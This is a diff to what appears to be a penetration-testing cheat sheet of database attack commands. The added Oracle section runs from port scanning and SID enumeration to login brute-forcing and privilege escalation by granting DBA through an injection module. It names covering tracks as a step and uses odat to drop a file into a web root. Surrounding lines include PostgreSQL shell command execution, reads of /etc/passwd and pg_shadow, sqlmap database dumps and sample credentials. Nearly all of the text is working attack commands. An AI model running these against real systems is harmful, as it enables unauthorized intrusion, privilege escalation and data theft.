@@ -21,8 +21,8 @@ msf > use auxiliary/admin/mssql/mssql_exec
 
 # MySQL
 
-mysql -h <IP> -u <username> -p          # Login remotely
-mysql -u root                           # Login locally as root
+mysql -h <IP> -u <username> -p <password>    # Login remotely
+mysql -h 10.0.0.10 -u root -p toor
 
 CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
 CREATE DATABASE <database>;
@@ -125,6 +125,78 @@ fl4gk33p3r	2DCsG47k5C77X5uMwIwO
 Login > Profile > flag
 ------------------------------------------------------------------------------------------------------
 
+# Oracle
+
+
+1. Locate a system running Oracle.
+2. Determine Oracle version.
+3. Determine Oracle SID.
+4. Guess/Bruteforce USERNAME/PASS.
+5. Privilege escalation via SQL injection.
+6. Manipulate data/post exploitation.
+7. Cover tracks.
+
+
+1. nmap -Pn -n -T4 --open -p1521 <target IP>
+
+2. Example 1
+     msf > use auxiliary/scanner/oracle/tnslsnr_version
+     db_notes
+
+   Example 2
+     tnscmd10g version -h <target IP>
+     tnscmd10g status -h <target IP>
+     Look for the version, LOGFILE, TRACING and PORT.
+
+3. Example 1
+     msf > use auxiliary/scanner/oracle/sid_enum
+     msf > use auxiliary/admin/oracle/sid_brute
+
+   Example 2
+     sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt
+
+   Example 3
+     http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
+
+4. Example 1
+     msf > use auxiliary/admin/oracle/login_brute
+     set SID <sid>
+
+   Example 2
+     sqlplus <username>/<password>@<target IP>:<port>/<SID>
+
+5. msf > use auxiliary/admin/oracle/sql
+   set DBUSER <user>
+   set DBPASS <password>
+   set SID <sid>
+   set SQL select * from user_role_privs
+
+   msf > use auxiliary/admin/oracle/pushin/lt_findricset_cursor
+   set DBUSER <user>
+   set DBPASS <password>
+   set SID <sid>
+   set SQL GRANT DBA TO <user>
+   set SQL GRANT JAVASYSPRIV TO <user>
+
+6. select * from v$version;                  -- Oracle version
+   select * from dba_registry_history;       -- Oracle patch level
+   select * from all_users;                  -- usernames
+   select owner,table_name from all_tables;  -- tables
+   select * from session_roles;              -- session roles
+   desc utl_http                             -- describes database objects
+
+http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
+
+sqlplus user/password@target IP:1521/database
+sqlplus user/password@target IP:1521/database as sysdba
+
+select * from v$Version;                       # Show the database version
+select * from user_role_privs;                 # Check database user permissions
+
+./odat.pydbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> --putFile 'C:\inetpub\wwwroot\' 'test.txt' /root/test.txt --sysdba
+curl https://target IP/test.txt
+------------------------------------------------------------------------------------------------------
+
 # Postgresql
 
 psql -U <username> -h <IP> -d <database>
@@ -132,21 +204,21 @@ select username, passwd from pg_shadow;
 select current_database();
 create table test (input TEXT); copy test from '/etc/passwd'; select input from test;
 
-psql -U postgres -h <IP>                     # Login with user 'postgres' and no password
-\l                                           # List databases
-\du                                          # List database users
-select pg_ls_dir('/etc');                    # List directory contents of /etc
-\c postgres                                  # Connect to the 'postgres' db
-\d                                           # List of tables
+psql -U postgres -h <IP>                       # Login with user 'postgres' and no password
+\l                                             # List databases
+\du                                            # List database users
+select pg_ls_dir('/etc');                      # List directory contents of /etc
+\c postgres                                    # Connect to the 'postgres' db
+\d                                             # List of tables
 
-create table tmp(data text);                 # Create a table called 'tmp'
-copy tmp(data) from program 'ls -l /home';   # Run a command in the shell and save the output
-select * from tmp;                           # Print the contents of the table
+create table tmp(data text);                   # Create a table called 'tmp'
+copy tmp(data) from program 'ls -l /home';     # Run a command in the shell and save the output
+select * from tmp;                             # Print the contents of the table
 
 copy tmp from '/etc/passwd';
 select * from tmp;
 
-delete from tmp;                             # Clear the table
+delete from tmp;                               # Clear the table
 
 Replace 'ls -l /home' with whatever command you'd like to run.
 drop table tmp;
@@ -176,7 +248,7 @@ admin’;--
 
 # sqlmap
 
-sqlmap -r login.txt --level 5 --risk 3       # Captured login using Burp
+sqlmap -r login.txt --level 5 --risk 3         # Captured login using Burp
  
 sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                # Show all dbs
 sqlmap -u "http://target/index.html?page=1" -D <db> --tables --dump --batch     # Show all tables in a particular db
